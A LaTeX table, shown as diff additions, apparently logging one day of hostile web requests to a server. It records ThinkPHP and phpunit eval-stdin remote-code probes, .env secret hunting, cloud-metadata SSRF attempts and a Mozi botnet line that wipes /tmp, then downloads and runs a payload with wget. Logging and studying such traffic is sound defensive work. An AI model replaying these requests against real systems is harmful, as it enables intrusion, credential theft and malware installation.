+160 & 2020-04-30 01:06:02 & 44.224.22.196   & GET /                                                                                                                               \\ \hline
+161 & 2020-04-30 01:06:02 & 44.224.22.196   & GET /latest/dynamic/instance-identity/document                                                                                      \\ \hline
+162 & 2020-04-30 01:06:03 & 44.224.22.196   & GET /latest/dynamic/instance-identity/document                                                                                      \\ \hline
+163 & 2020-04-30 01:06:24 & 184.105.247.196 & GET /                                                                                                                               \\ \hline
+179 & 2020-04-30 05:08:08 & 164.52.24.162   & GET /                                                                                                                               \\ \hline
+180 & 2020-04-30 06:14:35 & 62.173.152.144  & GET / HTTP/1.0                                                                                                                      \\ \hline
+181 & 2020-04-30 08:22:05 & 5.101.0.209     & GET /solr/admin/info/system?wt=json                                                                                                 \\ \hline
+182 & 2020-04-30 08:31:04 & 5.101.0.209     & GET /?XDEBUG\_SESSION\_START=phpstorm                                                                                               \\ \hline
+183 & 2020-04-30 08:31:04 & 5.101.0.209     & GET /?a=fetch\&content=\textless{}php\textgreater{}die(@md5(HelloThinkCMF))\textless{}/php\textgreater{}                            \\ \hline
+184 & 2020-04-30 08:34:06 & 5.101.0.209     & GET /index.php?s=/Index/	hinkapp/invokefunction\&function=call\_user\_func\_array\&vars{[}0{]}=md5\&vars{[}1{]}{[}{]}=HelloThinkPHP \\ \hline
+185 & 2020-04-30 08:50:18 & 83.97.20.31     & GET / HTTP/1.0                                                                                                                      \\ \hline
+186 & 2020-04-30 09:48:07 & 154.8.204.200   & GET /TP/public/index.php                                                                                                            \\ \hline
+187 & 2020-04-30 09:48:08 & 154.8.204.200   & GET /TP/index.php                                                                                                                   \\ \hline
+188 & 2020-04-30 09:48:08 & 154.8.204.200   & GET /thinkphp/html/public/index.php                                                                                                 \\ \hline
+189 & 2020-04-30 09:48:09 & 154.8.204.200   & GET /html/public/index.php                                                                                                          \\ \hline
+190 & 2020-04-30 09:48:10 & 154.8.204.200   & GET /public/index.php                                                                                                               \\ \hline
+191 & 2020-04-30 09:48:11 & 154.8.204.200   & GET /TP/html/public/index.php                                                                                                       \\ \hline
+192 & 2020-04-30 09:48:11 & 154.8.204.200   & GET /elrekt.php                                                                                                                     \\ \hline
+193 & 2020-04-30 09:48:12 & 154.8.204.200   & GET /index.php                                                                                                                      \\ \hline
+194 & 2020-04-30 09:48:13 & 154.8.204.200   & GET /                                                                                                                               \\ \hline
+195 & 2020-04-30 10:50:20 & 5.101.0.209     & POST /api/jsonws/invoke                                                                                                             \\ \hline
+196 & 2020-04-30 12:14:13 & 44.224.22.196   & GET http://example.com/                                                                                                             \\ \hline
+197 & 2020-04-30 12:14:14 & 44.224.22.196   & GET http://169.254.169.254/                                                                                                         \\ \hline
+198 & 2020-04-30 12:14:14 & 44.224.22.196   & GET http://{[}::ffff:a9fe:a9fe{]}/                                                                                                  \\ \hline
+199 & 2020-04-30 12:14:14 & 44.224.22.196   & GET http://169.254.169.254/latest/dynamic/instance-identity/document                                                                \\ \hline
+200 & 2020-04-30 12:14:14 & 44.224.22.196   & GET http://{[}::ffff:a9fe:a9fe{]}/latest/dynamic/instance-identity/document                                                         \\ \hline
+201 & 2020-04-30 12:14:15 & 44.224.22.196   & GET /                                                                                                                               \\ \hline
+202 & 2020-04-30 12:14:15 & 44.224.22.196   & GET /                                                                                                                               \\ \hline
+203 & 2020-04-30 12:14:15 & 44.224.22.196   & GET /                                                                                                                               \\ \hline
+204 & 2020-04-30 12:14:15 & 44.224.22.196   & GET /latest/dynamic/instance-identity/document                                                                                      \\ \hline
+205 & 2020-04-30 12:14:16 & 44.224.22.196   & GET /latest/dynamic/instance-identity/document                                                                                      \\ \hline
+206 & 2020-04-30 12:22:46 & 110.52.140.106  & GET /w00tw00t.at.blackhats.romanian.anti-sec:)                                                                                      \\ \hline
+207 & 2020-04-30 12:22:52 & 110.52.140.106  & GET /phpMyAdmin/scripts/setup.php                                                                                                   \\ \hline
+208 & 2020-04-30 12:22:58 & 110.52.140.106  & GET /phpmyadmin/scripts/setup.php                                                                                                   \\ \hline
+209 & 2020-04-30 12:23:04 & 110.52.140.106  & GET /pma/scripts/setup.php                                                                                                          \\ \hline
+210 & 2020-04-30 12:23:10 & 110.52.140.106  & GET /myadmin/scripts/setup.php                                                                                                      \\ \hline
+211 & 2020-04-30 12:23:16 & 110.52.140.106  & GET /MyAdmin/scripts/setup.php                                                                                                      \\ \hline
+212 & 2020-04-30 12:26:45 & 18.138.224.111  & GET /                                                                                                                               \\ \hline
+213 & 2020-04-30 12:26:46 & 18.138.224.111  & GET /.env                                                                                                                           \\ \hline
+214 & 2020-04-30 12:26:46 & 18.138.224.111  & GET /.remote                                                                                                                        \\ \hline
+215 & 2020-04-30 12:26:47 & 18.138.224.111  & GET /.local                                                                                                                         \\ \hline
+216 & 2020-04-30 12:26:47 & 18.138.224.111  & GET /.production                                                                                                                    \\ \hline
+217 & 2020-04-30 12:26:48 & 18.138.224.111  & GET /vendor/.env                                                                                                                    \\ \hline
+218 & 2020-04-30 12:26:48 & 18.138.224.111  & GET /lib/.env                                                                                                                       \\ \hline
+219 & 2020-04-30 12:26:49 & 18.138.224.111  & GET /lab/.env                                                                                                                       \\ \hline
+220 & 2020-04-30 12:26:49 & 18.138.224.111  & GET /cronlab/.env                                                                                                                   \\ \hline
+221 & 2020-04-30 12:26:50 & 18.138.224.111  & GET /cron/.env                                                                                                                      \\ \hline
+222 & 2020-04-30 12:26:50 & 18.138.224.111  & GET /core/.env                                                                                                                      \\ \hline
+223 & 2020-04-30 12:26:51 & 18.138.224.111  & GET /core/app/.env                                                                                                                  \\ \hline
+224 & 2020-04-30 12:26:51 & 18.138.224.111  & GET /core/Datavase/.env                                                                                                             \\ \hline
+225 & 2020-04-30 12:26:52 & 18.138.224.111  & GET /database/.env                                                                                                                  \\ \hline
+226 & 2020-04-30 12:26:52 & 18.138.224.111  & GET /config/.env                                                                                                                    \\ \hline
+227 & 2020-04-30 12:26:53 & 18.138.224.111  & GET /assets/.env                                                                                                                    \\ \hline
+228 & 2020-04-30 12:26:54 & 18.138.224.111  & GET /app/.env                                                                                                                       \\ \hline
+229 & 2020-04-30 12:26:54 & 18.138.224.111  & GET /apps/.env                                                                                                                      \\ \hline
+230 & 2020-04-30 12:26:55 & 18.138.224.111  & GET /uploads/.env                                                                                                                   \\ \hline
+231 & 2020-04-30 12:26:55 & 18.138.224.111  & GET /sitemaps/.env                                                                                                                  \\ \hline
+232 & 2020-04-30 12:26:56 & 18.138.224.111  & POST //admin/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php                                                                     \\ \hline
+233 & 2020-04-30 12:26:56 & 18.138.224.111  & POST //api/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php                                                                       \\ \hline
+234 & 2020-04-30 12:26:57 & 18.138.224.111  & POST //backup/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php                                                                    \\ \hline
+235 & 2020-04-30 12:26:57 & 18.138.224.111  & POST //blog/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php                                                                      \\ \hline
+236 & 2020-04-30 12:26:58 & 18.138.224.111  & POST //cms/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php                                                                       \\ \hline
+237 & 2020-04-30 12:26:59 & 18.138.224.111  & POST //crm/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php                                                                       \\ \hline
+238 & 2020-04-30 12:26:59 & 18.138.224.111  & POST //demo/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php                                                                      \\ \hline
+239 & 2020-04-30 12:27:00 & 18.138.224.111  & POST //dev/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php                                                                       \\ \hline
+240 & 2020-04-30 12:27:00 & 18.138.224.111  & POST //laravel/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php                                                                   \\ \hline
+241 & 2020-04-30 12:27:01 & 18.138.224.111  & POST //lib/phpunit/Util/PHP/eval-stdin.php                                                                                          \\ \hline
+242 & 2020-04-30 12:27:01 & 18.138.224.111  & POST //lib/phpunit/phpunit/Util/PHP/eval-stdin.php                                                                                  \\ \hline
+243 & 2020-04-30 12:27:02 & 18.138.224.111  & POST //lib/phpunit/phpunit/src/Util/PHP/eval-stdin.php                                                                              \\ \hline
+244 & 2020-04-30 12:27:02 & 18.138.224.111  & POST //lib/phpunit/src/Util/PHP/eval-stdin.php                                                                                      \\ \hline
+245 & 2020-04-30 12:27:03 & 18.138.224.111  & POST //new/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php                                                                       \\ \hline
+246 & 2020-04-30 12:27:03 & 18.138.224.111  & POST //old/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php                                                                       \\ \hline
+247 & 2020-04-30 12:27:04 & 18.138.224.111  & POST //panel/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php                                                                     \\ \hline
+248 & 2020-04-30 12:27:04 & 18.138.224.111  & POST //phpunit/Util/PHP/eval-stdin.php                                                                                              \\ \hline
+249 & 2020-04-30 12:27:05 & 18.138.224.111  & POST //phpunit/phpunit/Util/PHP/eval-stdin.php                                                                                      \\ \hline
+250 & 2020-04-30 12:27:05 & 18.138.224.111  & POST //phpunit/phpunit/src/Util/PHP/eval-stdin.php                                                                                  \\ \hline
+251 & 2020-04-30 12:27:06 & 18.138.224.111  & POST //phpunit/src/Util/PHP/eval-stdin.php                                                                                          \\ \hline
+252 & 2020-04-30 12:27:06 & 18.138.224.111  & POST //protected/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php                                                                 \\ \hline
+253 & 2020-04-30 12:27:07 & 18.138.224.111  & POST //sites/all/libraries/mailchimp/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php                                             \\ \hline
+254 & 2020-04-30 12:27:07 & 18.138.224.111  & POST //vendor/phpunit/Util/PHP/eval-stdin.php                                                                                       \\ \hline
+255 & 2020-04-30 12:27:08 & 18.138.224.111  & POST //vendor/phpunit/phpunit/Util/PHP/eval-stdin.php                                                                               \\ \hline
+256 & 2020-04-30 12:27:08 & 18.138.224.111  & POST //vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php                                                                           \\ \hline
+257 & 2020-04-30 12:27:09 & 18.138.224.111  & POST //vendor/phpunit/src/Util/PHP/eval-stdin.php                                                                                   \\ \hline
+258 & 2020-04-30 12:27:09 & 18.138.224.111  & POST //wp-content/plugins/cloudflare/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php                                             \\ \hline
+259 & 2020-04-30 12:27:10 & 18.138.224.111  & POST //wp-content/plugins/dzs-videogallery/class\_parts/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php                          \\ \hline
+260 & 2020-04-30 12:27:10 & 18.138.224.111  & POST //wp-content/plugins/jekyll-exporter/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php                                        \\ \hline
+261 & 2020-04-30 12:27:11 & 18.138.224.111  & POST //wp-content/plugins/mm-plugin/inc/vendors/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php                                  \\ \hline
+262 & 2020-04-30 12:27:11 & 18.138.224.111  & POST //www/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php                                                                       \\ \hline
+263 & 2020-04-30 12:48:22 & 110.52.140.106  & GET /w00tw00t.at.blackhats.romanian.anti-sec:)                                                                                      \\ \hline
+264 & 2020-04-30 12:48:28 & 110.52.140.106  & GET /phpMyAdmin/scripts/setup.php                                                                                                   \\ \hline
+265 & 2020-04-30 12:48:34 & 110.52.140.106  & GET /phpmyadmin/scripts/setup.php                                                                                                   \\ \hline
+266 & 2020-04-30 12:48:40 & 110.52.140.106  & GET /pma/scripts/setup.php                                                                                                          \\ \hline
+267 & 2020-04-30 12:48:46 & 110.52.140.106  & GET /myadmin/scripts/setup.php                                                                                                      \\ \hline
+268 & 2020-04-30 12:48:52 & 110.52.140.106  & GET /MyAdmin/scripts/setup.php                                                                                                      \\ \hline
+269 & 2020-04-30 12:52:25 & 44.224.22.196   & GET http://example.com/                                                                                                             \\ \hline
+270 & 2020-04-30 12:52:25 & 44.224.22.196   & GET http://169.254.169.254/                                                                                                         \\ \hline
+271 & 2020-04-30 12:52:26 & 44.224.22.196   & GET http://{[}::ffff:a9fe:a9fe{]}/                                                                                                  \\ \hline
+272 & 2020-04-30 12:52:26 & 44.224.22.196   & GET http://169.254.169.254/latest/dynamic/instance-identity/document                                                                \\ \hline
+273 & 2020-04-30 12:52:26 & 44.224.22.196   & GET http://{[}::ffff:a9fe:a9fe{]}/latest/dynamic/instance-identity/document                                                         \\ \hline
+274 & 2020-04-30 12:52:26 & 44.224.22.196   & GET /                                                                                                                               \\ \hline
+275 & 2020-04-30 12:52:27 & 44.224.22.196   & GET /                                                                                                                               \\ \hline
+276 & 2020-04-30 12:52:27 & 44.224.22.196   & GET /                                                                                                                               \\ \hline
+277 & 2020-04-30 12:52:27 & 44.224.22.196   & GET /latest/dynamic/instance-identity/document                                                                                      \\ \hline
+278 & 2020-04-30 12:52:27 & 44.224.22.196   & GET /latest/dynamic/instance-identity/document                                                                                      \\ \hline
+279 & 2020-04-30 13:04:49 & 73.103.89.163   & GET /                                                                                                                               \\ \hline
+280 & 2020-04-30 13:04:54 & 73.103.89.163   & GET /cgi-bin/                                                                                                                       \\ \hline
+281 & 2020-04-30 13:04:55 & 73.103.89.163   & GET /cgi-bin/server\_logs.py                                                                                                        \\ \hline
+282 & 2020-04-30 13:05:03 & 73.103.89.163   & GET /cgi-bin/server\_logs.py                                                                                                        \\ \hline
+283 & 2020-04-30 13:05:04 & 73.103.89.163   & GET /favicon.ico                                                                                                                    \\ \hline
+284 & 2020-04-30 13:05:24 & 23.95.82.154    & GET /cfg/phone1.cfg                                                                                                                 \\ \hline
+285 & 2020-04-30 13:05:24 & 23.95.82.154    & GET /aastra.cfg                                                                                                                     \\ \hline
+286 & 2020-04-30 13:05:24 & 23.95.82.154    & GET /000000000000.cfg                                                                                                               \\ \hline
+287 & 2020-04-30 13:05:24 & 23.95.82.154    & GET /cfg/sip.cfg                                                                                                                    \\ \hline
+288 & 2020-04-30 13:05:24 & 23.95.82.154    & GET /cfg/000000000000.cfg                                                                                                           \\ \hline
+289 & 2020-04-30 13:05:25 & 23.95.82.154    & GET /cfg/aastra.cfg                                                                                                                 \\ \hline
+290 & 2020-04-30 13:05:25 & 23.95.82.154    & GET /sip.cfg                                                                                                                        \\ \hline
+291 & 2020-04-30 13:05:25 & 23.95.82.154    & GET /phone1.cfg                                                                                                                     \\ \hline
+292 & 2020-04-30 13:31:46 & 162.243.138.114 & GET /ReportServer                                                                                                                   \\ \hline
+293 & 2020-04-30 14:30:49 & 73.103.89.163   & GET /favicon.ico                                                                                                                    \\ \hline
+294 & 2020-04-30 14:51:42 & 138.99.216.171  & GET / HTTP/1.0                                                                                                                      \\ \hline
+295 & 2020-04-30 14:58:40 & 80.82.68.69     & GET /                                                                                                                               \\ \hline
+296 & 2020-04-30 14:58:40 & 80.82.68.69     & GET /robots.txt                                                                                                                     \\ \hline
+297 & 2020-04-30 14:58:41 & 80.82.68.69     & GET /favicon.ico                                                                                                                    \\ \hline
+298 & 2020-04-30 15:20:26 & 162.243.138.241 & GET /hudson                                                                                                                         \\ \hline
+299 & 2020-04-30 15:23:10 & 73.103.89.163   & GET /cgi-bin/server\_logs.py                                                                                                        \\ \hline
+300 & 2020-04-30 15:25:48 & 49.143.32.6     & GET /shell?cd+/tmp;rm+-rf+*;wget+http://192.168.1.1:8088/Mozi.a;chmod+777+Mozi.a;/tmp/Mozi.a+jaws                                   \\ \hline
+301 & 2020-04-30 16:18:20 & 5.101.0.209     & GET /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php                                                                             \\ \hline
+302 & 2020-04-30 16:18:30 & 73.103.89.163   & GET /cgi-bin/server\_logs.py                                                                                                        \\ \hline
+303 & 2020-04-30 16:18:33 & 73.103.89.163   & GET /cgi-bin/server\_logs.py                                                                                                        \\ \hline
+304 & 2020-04-30 16:18:34 & 73.103.89.163   & GET /favicon.ico                                                                                                                    \\ \hline
+305 & 2020-04-30 16:53:47 & 128.14.134.170  & GET /                                                                                                                               \\ \hline
+\end{longtable}
 \end{document}
